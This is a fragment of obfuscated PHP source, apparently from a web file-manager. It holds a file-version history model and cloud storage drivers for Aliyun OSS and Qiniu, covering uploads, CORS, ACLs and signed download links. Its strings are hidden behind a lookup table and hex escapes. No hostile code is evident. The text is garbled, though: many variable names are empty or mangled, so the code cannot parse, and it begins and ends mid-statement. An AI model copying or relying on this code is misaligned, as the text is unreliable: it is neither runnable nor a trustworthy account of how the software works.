$Ӆ[473] => $[$Ӆ[224]], $Ӆ[1697] => $Ӆ[12])); } return $this->eventListParse($䞱߇, $); } private function eventListParse($, $) { $ =& $_SERVER[ʯ]; $ = $[$[421]]; $ = array_to_keyvalue($, $[12], $[190]); $͠ = array_to_keyvalue($, $[12], $[2124]); foreach ($ as $Ȥ) { $ = $Ȥ[$[502]]; if ($Ȥ[$[43]] == $[596] && isset($[$[1221]])) { $[] = $[$[1221]] . $[12]; $[] = $[$[1222]] . $[12]; } if ($Ȥ[$[43]] == $[2134] && isset($[$[190]])) { $[] = $[$[190]] . $[12]; } } $ = array_merge($, $͠, array($ . $[12])); $ = array_unique($); $Ѿ = array_unique(array_to_keyvalue($, $[12], $[1704])); $Ԑ = Model($[575])->userListInfo($Ѿ); $ = Model($[885])->sourceListInfo($, !0); foreach ($ as &$Ȥ) { if ($Ȥ[$[43]] == $[596] && isset($Ȥ[$[502]][$[1221]])) { $Ȥ[$[502]][$[1221]] = $[$Ȥ[$[502]][$[1221]]]; $Ȥ[$[502]][$[1222]] = $[$Ȥ[$[502]][$[1222]]]; } if ($Ȥ[$[43]] == $[2134] && isset($Ȥ[$[502]][$[190]])) { $Ȥ[$[502]][$[190]] = $[$Ȥ[$[502]][$[190]]]; } $Ȥ[$[97]] = $[$Ȥ[$[190]]]; $Ȥ[$[2139]] = $[$Ȥ[$[2124]]]; if ($Ȥ[$[43]] == $[1865]) { $Ȥ[$[2139]] = $Ȥ[$[97]]; $Ȥ[$[2124]] = $Ȥ[$[2139]][$[190]]; $Ȥ[$[97]] = !1; $Ȥ[$[190]] = $[12]; } $Ȥ[$[2068]] = $Ԑ[$Ȥ[$[1704]]]; } unset($Ȥ); $[$[421]] = $; return $; } public function removeBySource($ȁև) { $ = array($_SERVER[ʯ][467] => $ȁև); $this->where($)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\162\x63\145\x5f\150\151\163\164\x6f\x72\171"; public function historyCount($) { $ؙ =& $_SERVER[ʯ]; if (!$) { return array(); } if (is_string($) || is_int($)) { $ = array($); } $ø = array($ؙ[190], $ؙ[1929] => $ؙ[541]); $ = array($ؙ[190] => array($ؙ[7], $)); $ = $this->field($ø)->where($)->group($ؙ[190])->select(); return array_to_keyvalue($, $ؙ[190], $ؙ[541]); } public function addHistory($׀, $ݑ = '') { $Ɉ =& $_SERVER[ʯ]; $Ȣ = array($Ɉ[467] => $׀[$Ɉ[190]], $Ɉ[1695] => isset($׀[$Ɉ[505]]) ? $׀[$Ɉ[505]] : $׀[$Ɉ[503]], $Ɉ[518] => $׀[$Ɉ[517]], $Ɉ[593] => $׀[$Ɉ[86]], $Ɉ[2140] => $ݑ); if ($GLOBALS[$Ɉ[6]][$Ɉ[99]][$Ɉ[1278]] >= 1) { $this->historyAutoClear($Ȣ[$Ɉ[190]]); $this->add($Ȣ); } Hook::trigger($Ɉ[2141], $Ȣ); Model($Ɉ[2142])->eventFileEdit($׀[$Ɉ[190]]); } private function historyAutoClear($Ѝ) { $֏ =& $_SERVER[ʯ]; $ = Model($֏[830])->get($֏[1300]); $ = $GLOBALS[$֏[6]][$֏[99]][$֏[1278]]; $ = $ == $֏[1301] ? min(5, $) : $; $ = $ <= 0 ? 0 : $ - 1; if ($ >= 500) { return; } $Α = array($֏[467] => $Ѝ); $ = $this->field($֏[2143])->where($Α)->order($֏[2137])->select(); if (!$ || $ >= count($)) { return; } $擸 = array_to_keyvalue($, $֏[12], $֏[451]); $擸 = array_slice($擸, $); $ = array_to_keyvalue($, $֏[12], $֏[517]); $ = array_slice($, $); if (!$擸 || !$) { return; } $Α = array($֏[469] => array($֏[7], $擸)); $this->where($Α)->delete(); Model($֏[520])->remove($); } public function listData($糏) { $ =& $_SERVER[ʯ]; $ = array($[467] => $糏); $٦ = $[2144]; $Ɏ = $this->field($٦)->where($)->order($[2137])->selectPage(); $this->_listAppendUser($Ɏ[$[421]]); $ᛗ = Model($[830])->get($[1300]); $ = 5; if ($ᛗ == $[1301]) { $Ɏ[$[421]] = array_slice($Ɏ[$[421]], 0, $); $Ɏ[$[418]] = array($[2145] => 1, $[2146] => 20, $[2147] => 1, $[2148] => count($Ɏ[$[421]])); } return $Ɏ; } protected function _listAppendUser(&$) { $㷎 =& $_SERVER[ʯ]; $ = array_to_keyvalue($, $㷎[12], $㷎[1704]); $צ = Model($㷎[575])->userListInfo($); foreach ($ as &$Љ欯) { $ = $Љ欯[$㷎[1704]]; $Љ欯[$㷎[503]] = $צ[$] ? $צ[$] : !1; } unset($Љ欯); } public function fileInfo($) { $̙ =& $_SERVER[ʯ]; $ = $this->tablePrefix; $贋 = "{$}\151\x6f\137\146\x69\154\145\x20\x66\x69\154\145\163\40\157\x6e\x20\146\x69\154\x65\x73\56\x66\x69\154\145\111\x44\40\75\40\x68\151\163\164\x6f\x72\171\x2e\146\x69\154\145\111\x44"; return $this->alias($̙[2149])->where(array($̙[469] => $))->join($贋, $̙[2150])->find(); } public function removeItem($) { $ =& $_SERVER[ʯ]; $ = array($[469] => $); $κ = $this->where($)->find(); if ($κ) { $ς = $this->where($)->delete(); Model($[520])->remove($κ[$[517]]); return $ς; } return !1; } public function removeBySource($쿀) { $ =& $_SERVER[ʯ]; if (!$쿀) { return !1; } if (!is_array($쿀)) { $쿀 = array($쿀); } $ܴ = array($[467] => array($[7], $쿀)); $ԥ = $this->field($[518])->where($ܴ)->select(); if ($ԥ) { $this->where($ܴ)->delete(); $ʑ = array_to_keyvalue($ԥ, $[12], $[517]); Model($[520])->remove($ʑ); } return !0; } public function setDetail($, $݋) { $¨ =& $_SERVER[ʯ]; return $this->where(array($¨[469] => $))->save(array($¨[2140] => $݋)); } public function rollbackToItem($ʧ, $Ƞ) { $ =& $_SERVER[ʯ]; $ = Model($[885])->sourceInfo($ʧ); $this->addHistory($, LNG($[2151])); $ = $this->find($Ƞ); $؂ = array($[517] => $[$[517]], $[86] => $[$[86]], $[95] => time(), $[505] => USER_ID); Model($[885])->where(array($[190] => $ʧ))->save($؂); return $this->where(array($[469] => $Ƞ))->delete(); } public function clearSame($ك) { $߯ =& $_SERVER[ʯ]; $ = $this->listData($ك); $ = array_to_keyvalue_group($, $߯[517]); $ƀ = array(); $ɣ = array(); foreach ($ as $) { if (!$ || count($) <= 1) { continue; } foreach ($ as $ϩ) { $ƀ[] = $ϩ[$߯[517]]; $ɣ[] = $ϩ[$߯[451]]; } } if (!$ɣ) { return; } $this->where(array($߯[451] => array($߯[7], $ɣ)))->delete(); Model($߯[520])->remove($ƀ); } public function userSpace() { $ =& $_SERVER[ʯ]; $Ǩ = $this->tablePrefix; $ٷ = array($[1695] => USER_ID); $闊 = "{$Ǩ}\x69\x6f\137\146\151\x6c\x65\x20\x66\151\154\145\x73\40\157\x6e\40\146\151\154\145\x73\56\146\x69\154\x65\x49\x44\40\x3d\x20\x68\151\163\x74\x6f\162\171\x2e\146\x69\154\x65\111\x44"; return $this->alias($[2149])->where($ٷ)->join($闊, $[2150])->sum($[86]); } } goto B̲̽; C: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($) { parent::__construct(); include_once SDK_DIR . $_SERVER[ʯ][1427]; $this->_init($); } public function _init($畭) { $ٗփ =& $_SERVER[ʯ]; $this->config = $畭; foreach ($畭 as $ => $À) { if (isset($this->{$})) { $this->{$} = $À; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ٗփ[1428] . LNG($ٗփ[1429])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $뚇 =& $_SERVER[ʯ]; $腋 = new OSS\Model\CorsConfig(); $΀ = new OSS\Model\CorsRule(); $΀->addAllowedOrigin($뚇[1430]); $΀->addAllowedMethod($뚇[1431]); $΀->addAllowedMethod($뚇[1432]); $΀->addAllowedMethod($뚇[1433]); $΀->addAllowedMethod($뚇[1434]); $΀->addAllowedMethod($뚇[170]); $΀->setMaxAgeSeconds(600); $΀->addExposeHeader($뚇[1435]); $΀->addAllowedHeader($뚇[1430]); $腋->addRule($΀); try { $this->client->putBucketCors($this->bucket, $腋); } catch (OSS\Core\OssException $ڦ궹) { return !1; } return !0; } public function getBucketCors() { $ =& $_SERVER[ʯ]; $ = null; try { $ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $৬) { return null; } if (!$ || !($ = $->getRules())) { return null; } $۰ = $[0]->getAllowedOrigins(); $ = $[0]->getAllowedMethods(); $ՠ = $[0]->getMaxAgeSeconds(); $ = $[0]->getExposeHeaders(); $۔ = $[0]->getAllowedHeaders(); return array($[211] => isset($۰[0]) ? $۰[0] : $[12], $[215] => $, $[1436] => $ՠ, $[1437] => isset($[0]) ? $[0] : $[12], $[213] => isset($۔[0]) ? $۔[0] : $[12]); } public function isBucketCors() { $Ⴡ =& $_SERVER[ʯ]; $ߘլ = $this->getBucketCors(); if (!$ߘլ || !is_array($ߘլ)) { return !1; } if ($ߘլ[$Ⴡ[211]] != $Ⴡ[212] || $ߘլ[$Ⴡ[213]] != $Ⴡ[212]) { return !1; } $ = array_map($Ⴡ[214], $ߘլ[$Ⴡ[215]]); if (!is_array($)) { $ = array(); } $ = array($Ⴡ[216], $Ⴡ[217], $Ⴡ[218], $Ⴡ[219], $Ⴡ[220]); $ = array_diff($, $); return empty($); } public function mkfile($, $ŋ = '', $ʏ = REPEAT_RENAME) { $̏՜ = $this->setContent($, $ŋ); if ($̏՜ !== !1) { return $this->getPathOuter($); } return !1; } public function mkdir($ό۠, $ƥ枆 = REPEAT_SKIP) { if ($ƥ枆 && $this->_isFolder($ό۠)) { return $this->getPathOuter($ό۠); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ό۠)); } catch (OSS\Core\OssException $ݍ) { return !1; } return $this->getPathOuter($ό۠); } private function fileList($󑱞, $ɫ = '', $ƈ = 0) { $㗱 =& $_SERVER[ʯ]; $󑱞 = trim($󑱞, $㗱[8]); $ǫ = empty($󑱞) && $󑱞 !== $㗱[221] ? $㗱[12] : $󑱞 . $㗱[8]; $𿂄 = $㗱[12]; $ػ = 1000; $͍ = $ϱ = array(); while (!0) { check_abort(); $ = array($㗱[1438] => $ɫ, $㗱[1439] => $ǫ, $㗱[1440] => $ػ, $㗱[1441] => $𿂄); try { $ = $this->client->listObjects($this->bucket, $); } catch (OSS\Core\OssException $ݴ) { break; } $𿂄 = $->getNextMarker(); $ = $->getObjectList(); $ = $->getPrefixList(); foreach ($ as $ƙ) { if ($ƙ->getKey() == $ǫ) { continue; } $ǚբ = $ƙ->getKey(); $ށ = $ƙ->getSize(); $˷ = $ƙ->getLastModified(); $ = trim($ƙ->getETag(), $㗱[128]); $ = $ƈ ? array($㗱[42] => $ǚբ, $㗱[86] => $ށ, $㗱[203] => strtotime($˷), $㗱[1442] => $) : $ǚբ; $ = $ށ == 0 && substr($ǚբ, strlen($ǚբ) - 1, 1) == $㗱[8] ? !0 : !1; $ۍ = array($㗱[86] => $ށ, $㗱[1443] => $ށ, $㗱[95] => strtotime($˷), $㗱[1444] => $˷, $㗱[1442] => $); $this->cacheMethodInfoSet($ǚբ, $, $ۍ); if ($) { $͍[] = $ǚբ; continue; } $ϱ[] = $; } foreach ($ as $) { $͍[] = $->getPrefix(); $this->cacheMethodInfoSet($->getPrefix(), !0); } if ($𿂄 === $㗱[12]) { break; } } $this->cacheMethodInfoSet($󑱞, !0); return array($㗱[92] => $͍, $㗱[93] => $ϱ); } public function copyFile($, $̸) { $ = $this->size($); if ($ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $, $this->bucket, $this->pathEncode($̸)); } catch (OSS\Core\OssException $) { return !1; } return $this->getPathOuter($̸); } $ = $this->multiCopyObject($, $̸, $); return $ ? $this->getPathOuter($̸) : !1; } private function multiCopyObject($, $Ӊ, $) { $ =& $_SERVER[ʯ]; try { $ = array(); if ($誚ǁ = $this->hashMd5($)) { $ = array(OSS\OssClient::OSS_HEADERS => array($[1445] => $誚ǁ)); } $ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ӊ), $); $ￂ = 1; $Ǣ = 0; $ȥ = array(); $㕭 = 1024 * 1024 * 10; $ = $this->client->generateMultiuploadParts($, $㕭); foreach ($ as $Ƶ => $ч) { $ڼ = $Ǣ + (int) $ч[$[1446]]; $Ó = (int) $ч[$[389]] + $ڼ - 1; $ = array($[1447] => $ڼ, $[1448] => $Ó); $ȥ[] = $this->client->uploadPartCopy($this->bucket, $, $this->bucket, $this->pathEncode($Ӊ), $ￂ, $, $); $ￂ = $ￂ + 1; } $ = array(); foreach ($ȥ as $Ƶ => $) { $[] = array($[1449] => $Ƶ + 1, $[1450] => $); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ӊ), $, $); } catch (OSS\Core\OssException $ܐ) { return !1; } return !0; } public function moveFile($ʡ, $͚) { if ($this->copyFile($ʡ, $͚)) { $this->remove($ʡ); return $this->getPathOuter($͚); } return !1; } public function delFile($դ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($դ)); } catch (OSS\Core\OssException $ӈ) { return !1; } return !0; } public function delFolder($) { $΄ =& $_SERVER[ʯ]; if (!$this->exist($)) { return !0; } $this->listItemCache = !1; $٫ = $this->fileList($); $this->listItemCache = !0; $ = trim($, $΄[8]) . $΄[8]; if (!empty($) && $ !== $΄[221] && !in_array($, $٫[$΄[92]])) { $٫[$΄[92]][] = $; } $ = $this->delByBatch($٫[$΄[93]]); if (!$) { return !1; } $ = $this->delByBatch($٫[$΄[92]]); if (!$) { return !1; } return $this->delFile($); } private function delByBatch($) { foreach (array_chunk($, 1000) as $ʌ) { try { $this->client->deleteObjects($this->bucket, $ʌ); } catch (OSS\Core\OssException $) { return !1; } } return !0; } public function rename($, $) { return $this->renameObject($, $); } private function fileInfo($泊, $ = false, $à = array()) { $Ӊ =& $_SERVER[ʯ]; $ = array($Ӊ[42] => $this->pathThis($泊), $Ӊ[94] => $this->getPathOuter($泊), $Ӊ[43] => $Ӊ[223], $Ӊ[86] => isset($à[$Ӊ[86]]) ? $à[$Ӊ[86]] : 0, $Ӊ[184] => $this->ext($泊)); if ($) { return $; } $[$Ӊ[224]] = $[$Ӊ[95]] = 0; $[$Ӊ[225]] = $[$Ӊ[226]] = !0; if (empty($à)) { $ = $this->objectMeta($泊); if (!$) { return $; } $à = array($Ӊ[95] => strtotime($[$Ӊ[1444]]), $Ӊ[86] => $[$Ӊ[1443]] + 0, $Ӊ[1442] => $[$Ӊ[1442]]); } if (isset($à[$Ӊ[1442]]) && $à[$Ӊ[1442]]) { $[$Ӊ[228]] = trim($à[$Ӊ[1442]], $Ӊ[128]); } if (isset($à[$Ӊ[86]])) { $[$Ӊ[86]] = $à[$Ӊ[86]]; } if (isset($à[$Ӊ[95]])) { $[$Ӊ[95]] = $à[$Ӊ[95]]; } if (isset($à[$Ӊ[203]]) && !trim($[$Ӊ[95]])) { $[$Ӊ[95]] = $à[$Ӊ[203]]; } return $; } private function folderInfo($ݲ, $ = false, $ۍ = array()) { $ߺ =& $_SERVER[ʯ]; $𥗫 = array($ߺ[42] => $this->pathThis($ݲ), $ߺ[94] => $this->getPathOuter($ߺ[8] . $ݲ), $ߺ[43] => $ߺ[85]); if ($) { return $𥗫; } $𥗫[$ߺ[224]] = $𥗫[$ߺ[95]] = 0; $𥗫[$ߺ[225]] = $𥗫[$ߺ[226]] = !0; if (empty($ۍ)) { $ݲ = rtrim($ݲ, $ߺ[8]) . $ߺ[8]; $ = $this->objectMeta($ݲ); if (!$) { return $𥗫; } $ۍ = array($ߺ[224] => $[$ߺ[552]][$ߺ[1451]], $ߺ[95] => strtotime($[$ߺ[1444]])); } if (isset($ۍ[$ߺ[95]])) { $𥗫[$ߺ[95]] = $ۍ[$ߺ[95]]; } if (isset($ۍ[$ߺ[224]])) { $𥗫[$ߺ[224]] = $ۍ[$ߺ[224]]; } return $𥗫; } public function listPath($ꅄ, $ = false) { $ =& $_SERVER[ʯ]; $Қ = $this->fileList($ꅄ, $[8], !0); foreach ($Қ[$[92]] as $ƻ => $) { $Қ[$[92]][$ƻ] = $this->folderInfo($, $, $); } foreach ($Қ[$[93]] as $ƻ => $) { $Қ[$[93]][$ƻ] = $this->fileInfo($[$[42]], $, $); } return $Қ; } protected function infoChildren($ҵ, &$) { $ =& $_SERVER[ʯ]; $ɫ = $this->fileList($ҵ, $[12], !0); $[$[88]] += count($ɫ[$[92]]); $[$[87]] += count($ɫ[$[93]]); foreach ($ɫ[$[93]] as $ܻȻ) { if (!$ܻȻ || !$ܻȻ[$[86]]) { continue; } $[$[86]] += $ܻȻ[$[86]]; } } public function has($̚, $ = false, $ = true) { $靸 =& $_SERVER[ʯ]; $̚ = trim($̚, $靸[8]); $ͮ = empty($̚) && $̚ !== $靸[221] ? $靸[12] : $̚ . $靸[8]; $֧ = $靸[12]; $ = 500; $ԉ = $ͥ = 0; while (!0) { check_abort(); $ʹ = array($靸[1438] => $靸[8], $靸[1439] => $ͮ, $靸[1440] => $, $靸[1441] => $֧); try { $ڨ = $this->client->listObjects($this->bucket, $ʹ); } catch (OSS\Core\OssException $²) { break; } $֧ = $ڨ->getNextMarker(); $ = $ڨ->getObjectList(); $Ȁֲ = $ڨ->getPrefixList(); if ($) { if (count($) > 1 || count($) == 1 && $[0]->getKey() != $ͮ) { $ԉ += count($) - 1; } if (!empty($Ȁֲ)) { $ͥ += count($Ȁֲ); } if ($֧ === $靸[12]) { break; } continue; } if ($) { if (!empty($)) { if (count($) > 1 || $[0]->getKey() != $ͮ) { return !0; } } } else { if (!empty($Ȁֲ)) { return !0; } } if ($֧ === $靸[12]) { break; } } if ($) { return array($靸[232] => $ԉ, $靸[233] => $ͥ); } return !1; } public function listAll($) { $ڎУ =& $_SERVER[ʯ]; $ȏ = $this->fileList($, $ڎУ[12], !0); $ף = array_to_keyvalue($ȏ[$ڎУ[93]], $ڎУ[42]); foreach ($ȏ[$ڎУ[92]] as $ĕ) { if (is_string($ĕ)) { $ף[$ĕ] = array($ڎУ[86] => 0); } } return $this->listAllFiles($, $ף); } public function canRead($) { $ڜ =& $_SERVER[ʯ]; $簀ɐ = $this->pathAcl($); return $簀ɐ == $ڜ[1452] || $簀ɐ == $ڜ[595] ? !0 : !1; } public function canWrite($덐敛) { $ = $this->pathAcl($덐敛); return $ == $_SERVER[ʯ][595] ? !0 : !1; } public function pathAcl($) { $ꨖ =& $_SERVER[ʯ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ڝ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($)); } catch (OSS\Core\OssException $禀) { return !1; } $蘒 = $ڝ == $ꨖ[47] ? $this->bucketAcl : $ڝ; if ($蘒 == $ꨖ[1453]) { return $ꨖ[1452]; } if ($蘒 == $ꨖ[1454]) { return $ꨖ[595]; } return $蘒; } private function chmodPath($, $㌝ = '') { $ꧪй =& $_SERVER[ʯ]; $ = empty($㌝) ? $ꧪй[1454] : $㌝; $Գ = array($ꧪй[47], $ꧪй[222], $ꧪй[1453], $ꧪй[1454]); if (!in_array($, $Գ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($), $); } catch (OSS\Core\OssException $޾Ƨ) { return !1; } return !0; } public function getContent($) { return $this->fileSubstr($, -1); } public function setContent($Ѥ, $л = '') { $ږ =& $_SERVER[ʯ]; try { $ = $this->trafficLimit($ږ[1455]); $و = $this->client->putObject($this->bucket, $this->pathEncode($Ѥ), $л, $); } catch (OSS\Core\OssException $ϖ) { return !1; } $ = array($ږ[1445] => trim($و[$ږ[1442]], $ږ[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ѥ))); $this->updateObjMeta($Ѥ, $); return isset($و[$ږ[1456]][$ږ[283]]) ? !0 : !1; } private function updateObjMeta($ўǌ, $ܟ) { $ўǌ = $this->pathEncode($ўǌ); try { $ڏ = array(OSS\OssClient::OSS_HEADERS => $ܟ); $this->client->copyObject($this->bucket, $ўǌ, $this->bucket, $ўǌ, $ڏ); } catch (OSS\Core\OssException $ƪ) { return !1; } return !0; } public function upload($, $, $і = false, $ڼ = REPEAT_REPLACE) { $ =& $_SERVER[ʯ]; $° = trim($, $[8]); $ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($[1445] => @md5_file($)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($))); $ = $this->trafficLimit($[1455], $); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($°), $, $); } catch (OSS\Core\OssException $ҽ) { return !1; } return $this->getPathOuter($); } public function getHost() { $ =& $_SERVER[ʯ]; $ = explode($[207], parent::getHost()); return $[0] . $[207] . $this->bucket . $[10] . $[1]; } public function uploadFormData($۹, $˾ = 3600) { $܇ =& $_SERVER[ʯ]; if (!($ܛ = $this->getHost())) { return !1; } $ = $˾; $ = date($܇[1457], time() + $); $ = new DateTime($); $ = $->format(DateTime::ISO8601); $ = strpos($, $܇[348]); $ = substr($, 0, $) . $܇[1458]; $͈ = 1048576000 * 5; $􀘒 = $this->pathFather($۹); $ = array($܇[266] => $, $܇[269] => array(array($܇[1459], 0, $͈), array($܇[272], $܇[273], $􀘒))); $΅˵ = base64_encode(json_encode($)); $ = base64_encode(hash_hmac($܇[255], $΅˵, $this->secret, !0)); $ޓ = array($܇[284] => $΅˵, $܇[1460] => $this->accessKey, $܇[276] => $܇[265], $܇[1461] => $, $܇[205] => $ܛ); $ޓ = $this->trafficLimit($܇[1455], $ޓ); return $ޓ; } public function multiUploadFormData($, $Ƞ = 3600) { $ =& $_SERVER[ʯ]; if (!($ = $this->getHost())) { return !1; } $ = $this->trafficLimit($[1455]); $ԍ̘ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($), $); return array($[247] => $ԍ̘, $[205] => $ . $[8] . $this->pathEncode($), $[248] => gmdate($[1462]), $[104] => $); } public function multiUploadAuthData($, $ә = array()) { $乀 =& $_SERVER[ʯ]; $;ф = isset($ә[$乀[248]]) ? $ә[$乀[248]] : gmdate($乀[1462]); $ = isset($ә[$乀[184]]) ? $ә[$乀[184]] : $乀[12]; $䢼 = $; if (isset($ә[$乀[104]])) { $䢼 = $ә[$乀[104]]; unset($ә[$乀[104]]); } if (isset($ә[$乀[249]])) { $ә[$乀[248]] = $;ф; return $this->listUploadParts($䢼, $ә); } $ = array($乀[250], $乀[12], $乀[130], $;ф, "\170\x2d\157\163\x73\55\144\x61\164\145\x3a{$;ф}", $乀[8] . $this->bucket . $乀[8] . $䢼 . $); if (strpos($, $乀[251]) === 0) { $[0] = $乀[252]; if ($֐ = $this->trafficLimit($乀[1455])) { $䢼 = $乀[1463]; array_splice($, 5, 0, $䢼 . $乀[4] . $֐[$䢼]); } } if (isset($ә[$乀[253]]) && $ә[$乀[253]] == $乀[254]) { $[0] = $乀[254]; } if (!empty($ә[$乀[1464]])) { $ = array_merge(array($[4]), $ә[$乀[1464]]); sort($); $[4] = implode($乀[18], $); } $ڪ = implode($乀[18], $); $ = base64_encode(hash_hmac($乀[255], $ڪ, $this->secret, !0)); $١ = $乀[1428] . $this->accessKey . $乀[4] . $; if (strpos($, $乀[251]) === 0) { $١ = array($乀[257] => $١, $乀[248] => $;ф); if ($֐) { $١ = array_merge($١, $֐); } } return $١; } public function listUploadParts($۲, $Ը) { $פڂ =& $_SERVER[ʯ]; $̎ = parse_url_query($Ը[$פڂ[184]]); $Ŗ = $this->client->listParts($this->bucket, $this->pathEncode($۲), $̎[$פڂ[247]]); $풚é = $Ŗ->getListPart(); $ߞ = array(); foreach ($풚é as $њ) { $ߞ[] = array($פڂ[1449] => $њ->getPartNumber(), $פڂ[1450] => trim($њ->getETag(), $פڂ[128])); } unset($Ը[$פڂ[249]], $Ը[$פڂ[253]]); $ = $this->multiUploadAuthData($۲, $Ը); if (empty($)) { return !1; } return array($פڂ[257] => $, $פڂ[248] => $Ը[$פڂ[248]], $פڂ[259] => $ߞ); } public function download($ż, $ӂǲ) { if ($this->isFolder($ż)) { return !1; } try { $ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ӂǲ); $ = $this->trafficLimit($_SERVER[ʯ][119], $); $this->client->getObject($this->bucket, $this->pathEncode($ż), $); } catch (OSS\Core\OssException $) { return !1; } return $ӂǲ; } public function fileSubstr($Ҝ, $곁 = 0, $Σ = false) { if ($곁 === -1) { $ = array(); } else { if ($Σ === !1) { $ = $this->size($Ҝ); } else { $ = $곁 + $Σ - 1; } $ = array(OSS\OssClient::OSS_RANGE => "{$곁}\55{$}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Ҝ), $); } catch (OSS\Core\OssException $ַ) { think_exception($ַ->getMessage()); return !1; } } private function trafficLimit($丫, $ = array()) { $܌ =& $_SERVER[ʯ]; if ($丫 == $܌[1455] && $this->isUploadServer() || $丫 == $܌[119] && $this->isFileOutServer()) { return $; } $ = floatval($GLOBALS[$܌[6]][$܌[99]][$܌[117]][$丫]) * 1024 * 1024 * 8; if (!$) { return $; } $ = $ < 819200 ? 819200 : ($ > 838860800 ? 838860800 : $); $[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($); return $; } public function link($, $ = array()) { $Յ =& $_SERVER[ʯ]; if (!$this->exist($) || $this->isFolder($)) { return !1; } try { $ = $this->trafficLimit($Յ[119], $); $Ǖ = $this->client->signUrl($this->bucket, $this->pathEncode($), 3600 * 12, $Յ[254], $); return $this->getCdnLink($Ǖ); } catch (OSS\Core\OssException $) { return !1; } } public function fileOut($ͳ, $ = false, $ = false, $¹ = '') { $ =& $_SERVER[ʯ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ͳ, $, $, $¹); } if (!$) { $ = $this->pathThis($ͳ); } $ = rawurlencode($); $ = get_file_mime(get_path_ext($)); if ($ == $[241]) { return parent::fileOut($ͳ, $, $, $¹); } $ = $ ? $[1465] : $[1466]; $륫ӌ = array(OSS\OssClient::OSS_SUB_RESOURCE => $[1467] . rawurlencode("{$}\73\146\x69\154\145\156\x61\x6d\145\75{$}")); $륫ӌ[OSS\OssClient::OSS_SUB_RESOURCE] .= $[1468] . rawurlencode($); $ = $this->link($ͳ, $륫ӌ); $this->fileOutLink($); } public function fileOutServer($ޣ, $ۿ = false, $ěٻ = false, $㥴 = '') { parent::fileOut($ޣ, $ۿ, $ěٻ, $㥴); } public function fileOutImage($Ȇփ, $ = 250) { if ($this->size($Ȇփ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ȇփ, $); } $é = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ʯ][1469] . $); $È = $this->link($Ȇփ, $é); $this->fileOutLink($È); } public function fileOutImageServer($, $݆ݍ = 250) { parent::fileOutImage($, $݆ݍ); } public function fileOutLink($) { $Ԑ =& $_SERVER[ʯ]; if (!$this->isCdnHost() && substr($, 0, 7) == $Ԑ[1391]) { $ = $Ԑ[1392] . substr($, 7); } header($Ԑ[171] . $); die; } public function hashMd5($, $ = '') { $ =& $_SERVER[ʯ]; $Ϭ = $this->_objectMeta($); if (!$Ϭ) { return $[12]; } if (!isset($Ϭ[$[1445]]) && !empty($)) { $˲ = $this->updateObjMeta($, array($[1445] => $)); $Ϭ[$[1445]] = $˲ ? $ : $[12]; } return isset($Ϭ[$[1445]]) ? strtolower($Ϭ[$[1445]]) : $[12]; } public function size($) { $︩ = $this->objectMeta($); return $︩ ? $︩[$_SERVER[ʯ][86]] : 0; } public function info($) { if ($this->isFolder($)) { return $this->folderInfo($); } else { if ($this->isFile($)) { return $this->fileInfo($); } } return !1; } public function exist($䟚݋) { return $this->isFile($䟚݋) || $this->isFolder($䟚݋); } public function isFile($Ğ) { return !$this->isFolder($Ğ) && $this->objectMeta($Ğ); } public function isFolder($) { return $this->cacheMethod($_SERVER[ʯ][175], $); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[ʯ][177], $); } protected function _objectMeta($ϑ) { $ =& $_SERVER[ʯ]; try { $ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ϑ)); } catch (OSS\Core\OssException $) { $ = !1; } if ($) { $[$[86]] = intval($[$[1443]]); } return $; } protected function _isFolder($ӷ) { $ =& $_SERVER[ʯ]; if ($ӷ == $[12] || $ӷ == $[8]) { return !0; } $ = array($[1438] => $[8], $[1439] => rtrim($ӷ, $[8]) . $[8], $[1440] => 1, $[1441] => $[12]); $д = $this->client->listObjects($this->bucket, $); if ($д->getObjectList() || $д->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Ս) { parent::__construct(); require_once SDK_DIR . $_SERVER[ʯ][1470]; $this->_init($Ս); } public function _init($) { $ =& $_SERVER[ʯ]; $this->config = $; foreach ($ as $ɤ => $ߍȃ) { if (isset($this->{$ɤ})) { $this->{$ɤ} = $ߍȃ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($[1471] . LNG($[1429])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new 